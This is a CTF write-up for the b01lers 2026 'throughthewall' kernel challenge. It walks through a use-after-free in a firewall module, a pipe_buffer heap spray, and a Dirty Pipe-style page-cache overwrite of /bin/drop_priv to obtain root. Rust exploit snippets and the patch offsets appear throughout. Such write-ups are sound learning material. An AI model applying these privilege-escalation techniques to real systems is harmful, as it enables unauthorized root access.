+++
title = "b01lers ctf 2026: kernel pwn (part 1)"
date = "2026-04-30"
description = "Writeup for kernel pwn challenge from b01lers ctf 2026."
tags = [
    "kernel",
    "pwn",
]
+++
# Intro
Hello! Recently, I competed in b01lersc.tf with team 0bscuri7y, where we placed 12th. I managed to solve all the pwn challenges, and in this post, I’ll walk through my solutions for the kernel pwn tasks: throughthewall (part 1) and multifiles (part 2).

![alt text](/images/tw_1.png)
# throughthewall
[download](https://raw.githubusercontent.com/icctx/ctf/refs/heads/main/b01lers.2026/throughthewall/handout.zip)
## Recon
![alt text](/images/tw_2.png)

```sh
#!/bin/bash
# start.sh

qemu-system-x86_64 \
    -m 256M \
    -nographic \
    -kernel ./bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr" \
    -no-reboot \
    -cpu qemu64,+smep,+smap \
    -smp 2 \
    -initrd ./initramfs.cpio.gz \
    -monitor /dev/null \
    -s \
    2>&1 | tee vm.log
```

First, create the root directory and unpack the initramfs.
```sh
#!/bin/sh
mkdir -p root
cd root
gzip -dc ../initramfs.cpio.gz | cpio -idv
```

Let's look at the init script. It provides two key insights:
1. Communication with the driver is exposed to userland via `/dev/firewall` (`chmod 666`).
2. `/bin/drop_priv` runs in an infinite loop. Let's take a look at it before reversing the `.ko` module.

```c
// drop_priv:main
int main(void)
  {
      gid_t gid = 1000;
      setgroups(1, &gid);
      setgid(1000);
      setuid(1000);
      chdir("/home/ctf");
      execl("/bin/sh", "sh", NULL);
      return 1;
  }
```
We’ll use this shell wrapper later.

## Analysing the module
*firewall.ko*
It exposes four ioctl commands:
```c
FW_ADD_RULE   0x41004601UL
FW_DEL_RULE   0x40044602UL
FW_EDIT_RULE  0x44184603UL
FW_SHOW_RULE  0x84184604UL
```
  `FW_EDIT_RULE` writes user-controlled data into the object referenced by `rules[idx]`. Because the delete path leaves a dangling pointer behind, this function can also be used to modify a freed-and-reclaimed
  object.

  `FW_SHOW_RULE` reads data from the object referenced by `rules[idx]` and returns it to userland. Since freed entries are not cleared, it can also be used to inspect a reclaimed object through a stale pointer.

The bug itself is in the delete path. `FW_DEL_RULE` checks that `rules[idx]` exists and then calls `kfree(rules[idx])`, but it never clears the global pointer:
```c
kfree(rules[idx]);
// missing: rules[idx] = NULL;
```
As a result, the same index remains usable after free. `FW_SHOW_RULE` becomes a stale read primitive, and `FW_EDIT_RULE` becomes a stale write primitive over whatever object later reclaims that chunk.

## Heap Objects
In `fw_add_rule`, heap chunks are allocated with:
```c
kmem_cache_alloc_trace(kmalloc_caches[10], 0x400CC0, 0x400);
```
This is a regular `kmalloc` allocation from the `kmalloc-1k` cache.

When I was first learning the ropes on pawnyable.cafe, my first instinct for this primitive would have been to use tty_struct. This approach relies on being able to open /dev/ptmx, but a quick check of the environment showed that /dev/pts isn't mounted. Without that, this classic technique isn't viable here.

After looking for alternatives, I found that [pipe_buffer](https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/) is also suitable. Like `tty_struct`, it contains pointers that can be abused, and it lands in the right size class for our freed chunks.

The size also works out nicely. A single `pipe_buffer` is `0x28` bytes, and the default pipe ring has 16 slots:
```text
sizeof(struct pipe_buffer) = 0x28
16 * 0x28 = 0x280
```
The kernel allocates the pipe buffer array with `kcalloc()`, and a `0x280`-byte request is served from the same `kmalloc-1k` cache as the freed `0x400`-byte firewall rules. That makes it a good reclaim target for this UAF.

## First steps
The next step is to allocate 128 rules and free them. Then we spray `pipe_buffer` arrays into those freed slots.
Let's start by adding one rule. Reversing `fw_add_rule()` gives us the ioctl argument format.
fw_add_rule()
```c
 slot_idx = copy_from_user(user_buf, user_rule, 256);
  if ( slot_idx )
    return 0xFFFFFFFFFFFFFFF2LL;
  while ( rules[slot_idx] )                     
  {
    if ( ++slot_idx == 256 )
      return -12;
  }
  rule = kmem_cache_alloc_trace(kmalloc_caches[10], 0x400CC0u, 0x400u);
```
The function searches for a free slot in `rules[]`. That slot index is later returned to userland from `fw_add_rule_success_store()`.

From `parse_rule()`, we can recover the internal `firewall_rule` structure:
```c
00000000 struct firewall_rule // sizeof=0x400
00000000 {
00000000     u32 src_ip;
00000004     u32 dst_ip;
00000008     u16 dport;
0000000A     u16 action;
0000000C     char desc[1012];
00000400 };
```
This internal structure is created by parsing our input string. The expected format is:
```
<src_ip> <dst_ip> <dport> <action> <desc>
```

These are the wrappers we will use in the PoC:
```rust
fn fw_add(fd: c_int) -> io::Result<i32> {
    let mut rule = [0; 0x100];
    let text = b"1.1.1.1 2.2.2.2 80 1 cafe";

    rule[..text.len()].copy_from_slice(text);

    let idx = unsafe { ioctl(fd, IoctlCMD::FW_ADD_RULE as c_ulong, rule.as_ptr()) };
    if idx < 0 {
        Err(io::Error::last_os_error())
    } else {
        Ok(idx)
    }
}

fn fw_del(fd: c_int, idx: i32) -> io::Result<()> {
    let ret = unsafe { ioctl(fd, IoctlCMD::FW_DEL_RULE as c_ulong, idx as c_ulong) };
    if ret < 0 {
        Err(io::Error::last_os_error())
    } else {
        Ok(())
    }
}

```
Let's confirm the UAF by calling `fw_show` on `idxs[0]`.
```rust
fn fw_show(fd: c_int, idx: i32, off: u64, out: &mut [u8]) -> io::Result<()> {
    if out.len() > 0x400 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "FW_SHOW_RULE output buffer too large",
        ));
    }

    let mut req = FwReq {
        idx,
        pad: 0,
        off,
        size: out.len() as u64,
        data: [0; 0x400],
    }; 

    let ret = unsafe { ioctl(fd, IoctlCMD::FW_SHOW_RULE as c_ulong, &mut req) };
    if ret < 0 {
        Err(io::Error::last_os_error())
    } else {
        out.copy_from_slice(&req.data[..out.len()]);
        Ok(())
    }
}

fw_show(fd, idxs[0], 0, &mut leak).expect("FW_SHOW_RULE failed");
println!("[leak idx{}]: {:02x?}", idxs[0], &leak[..32]);
```
If the output still contains the rule string after deletion, the UAF is confirmed.

# Spray
Let's create 192 pipes and check the leak again.
```rust
fn pipe_create() -> io::Result<[c_int; 2]> {
    let mut fds = [-1; 2];
    let ret = unsafe { pipe(fds.as_mut_ptr()) };
    if ret < 0 {
        Err(io::Error::last_os_error())
    } else {
        Ok(fds)
    }
}
```
If you run:
```rust
    let mut pipes = Vec::new();
    for i in 0..192 {
        let pipefd = pipe_create().expect("pipe failed!");
        println!("[pipe {i}]: r={}, w={}", pipefd[0], pipefd[1]);
        pipes.push(pipefd);
    }

    let mut leak = [0; 0x400];
    fw_show(fd, idxs[0], 0, &mut leak).expect("FW_SHOW_RULE failed");
    println!("[leak idx[{}]]: {:02x?}", idxs[0], &leak[..32]);

```
At this point, you will see zeros. The reason is that a pipe does not get a useful `pipe_buffer` entry until data is written into it.

So the spray must also write a small tag into each pipe:
```rust
let mut pipes = Vec::new();
for i in 0..192 {
    let pipefd = pipe_create().expect("pipe failed!");
    let tag = vec![b'A' + (i % 26) as u8; i + 1];

    pipe_write(pipefd[1], &tag).expect("pipe write failed");

    println!("[pipe {i}]: r={}, w={}, len={}", pipefd[0], pipefd[1], tag.len());
    pipes.push(pipefd);
}
```
The length is intentional: `pipe_buffer.len == i + 1`, so once we leak a reclaimed `pipe_buffer`, we can recover the matching pipe as `hit_pipe = len - 1`.
```c
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};
```

```rust
    let pb = pipe_buffer_leak(&leak);
    println!(
        "[leak idx {}] page=0x{:016x} offset=0x{:x} len={} ops=0x{:016x} flags=0x{:x} private=0x{:016x}",
        idxs[0], pb.page, pb.offset, pb.len, pb.ops, pb.flags, pb.private
    );
```
## Dirty Pipe
Obviously, we will later corrupt data through the `FW_EDIT_RULE` operation. The real question is what to corrupt. The usual way is to corrupt the function table (`ops`), but remember `drop_priv` -  it is a perfect target for a [Dirty Pipe-style attack](https://dirtypipe.cm4all.com/).

If you are not familiar with this technique, I suggest reading:
1. https://dirtypipe.cm4all.com
2. https://0xnull007.github.io/posts/dirtypipe-cve-2022-0847
3. https://stdnoerr.blog/blog/DirtyPipe-CVE-2022-0847


To be clear, this is not exploiting CVE-2022-0847 directly. In the original Dirty Pipe bug, stale pipe buffer flags were accidentally preserved by the kernel after filling and draining a pipe. Here, the firewall UAF gives us a direct stale write into a reclaimed `pipe_buffer` array, so we set `PIPE_BUF_FLAG_CAN_MERGE` ourselves with `FW_EDIT_RULE`.

For this challenge, the write primitive is:
```text
1. Drain the chosen pipe.
2. Splice data from /bin/drop_priv at target_off - 1.
3. Corrupt the new file-backed pipe_buffer flags through FW_EDIT_RULE.
4. Write four zero bytes.
```
Since the spliced byte starts immediately before the target immediate, the following write merges into the page cache at exactly the offset we want.
This lets us patch the `drop_priv:main` immediates from `1000` to `0`, which gives us a root shell after killing the current shell and letting init respawn `drop_priv`.

## Exploitation
Since the exploitation process is already well-covered by the links above, I’ll focus on insights specific to this chal.
At this point, the heap state should look like this:
```text
rules[hit_idx]   -> stale pointer
                 -> reclaimed kmalloc-1024 chunk
                 -> struct pipe_buffer bufs[16]

pipes[hit_pipe] -> userspace fd pair backed by the same pipe_buffer array
```

The initial `write(pipefd[1], tag, i + 1)` populated slot 0. That slot is only used as a marker:
```text
bufs[0].len = i + 1
hit_pipe = bufs[0].len - 1
```

The stale rule gives us byte writes into the `pipe_buffer` array. The field we care about is:
```text
struct pipe_buffer {
    struct page *page;        // +0x00
    unsigned int offset;      // +0x08
    unsigned int len;         // +0x0c
    const struct pipe_buf_operations *ops; // +0x10
    unsigned int flags;       // +0x18
    unsigned long private;    // +0x20
};                            // sizeof = 0x28
```

So for any slot in the ring:
```text
flags_off(slot) = 0x18 + slot * 0x28
```

The first marked buffer uses slot 0, so I use the next slots for file-backed buffers:
```text
slot 1 -> patch gid local immediate
slot 2 -> patch setgid(1000)
slot 3 -> patch setuid(1000)
```

For each target offset in `/bin/drop_priv`, the primitive is:
```text
pipe_drain(pipe[hit_pipe][0])
splice(drop_priv_fd, target_off - 1, pipe[hit_pipe][1], NULL, 1, 0)
FW_EDIT_RULE(hit_idx, flags_off(slot), PIPE_BUF_FLAG_CAN_MERGE)
write(pipe[hit_pipe][1], "\x00\x00\x00\x00", 4)
pipe_drain(pipe[hit_pipe][0])
```

`splice()` inserts a file-backed `pipe_buffer` into the pipe ring. Its `page` points to the page cache page of `/bin/drop_priv`, and its `offset/len` describe the one byte at `target_off - 1`.

After that, setting `PIPE_BUF_FLAG_CAN_MERGE` changes how the following `write()` is handled. Instead of allocating a fresh anonymous pipe page, the kernel appends into the existing file-backed page cache buffer. Since the spliced byte is at `target_off - 1`, the four zero bytes land exactly at `target_off`.

The patch offsets are resolved once with `objdump` or `rizin` and then hardcoded in the exploit. The relevant part of `drop_priv::main` is:
```asm
00000000004017b5 <main>:
  4017d0: c7 45 f4 e8 03 00 00    mov    DWORD PTR [rbp-0xc],0x3e8
  4017d7: 48 8d 45 f4              lea    rax,[rbp-0xc]
  4017db: 48 89 c6                 mov    rsi,rax
  4017de: bf 01 00 00 00           mov    edi,0x1
  4017e3: e8 f8 4f 04 00           call   setgroups
  4017e8: bf e8 03 00 00           mov    edi,0x3e8
  4017ed: e8 5e 53 04 00           call   setgid
  4017f2: bf e8 03 00 00           mov    edi,0x3e8
  4017f7: e8 d4 52 04 00           call   setuid
```

Dirty Pipe writes use file offsets, not virtual addresses. `drop_priv` is a non-PIE static ELF whose text is based at `0x400000`, so the immediate offsets are:
```text
0x4017d3 - 0x400000 = 0x17d3  // gid_t gid = 1000
0x4017e9 - 0x400000 = 0x17e9  // setgid(1000)
0x4017f3 - 0x400000 = 0x17f3  // setuid(1000)
```

In the final exploit I just hardcode them:
```rust
const DROP_PRIV_PATCH_OFFSETS: [u64; 3] = [
    0x17d3,
    0x17e9,
    0x17f3,
];
```

Those immediates correspond to:
```c
gid_t gid = 1000;
setgid(1000);
setuid(1000);
```

After the three four-byte page-cache writes, the code behaves like:
```c
gid_t gid = 0;
setgid(0);
setuid(0);
```

The last step is just process control. The current shell is still the child of `drop_priv`, so killing its parent returns execution to init. The init script keeps running:
```sh
while true; do
    /bin/drop_priv
done
```

The next `/bin/drop_priv` run uses the patched page cache version, keeps uid/gid 0, and executes `/bin/sh`.

Here is the run from the VM:
![alt text](/images/tw_3.png)

Full source code can be found [here](https://github.com/icctx/ctf/tree/main/b01lers.2026/throughthewall/x/src).

---
# Conclusion
Hope you enjoyed the post!
Feel free to reach out if you’ve got any questions.
The next part will cover a harder "multifiles" challenge (hopefully, I’ll get my hands on writing it soon).
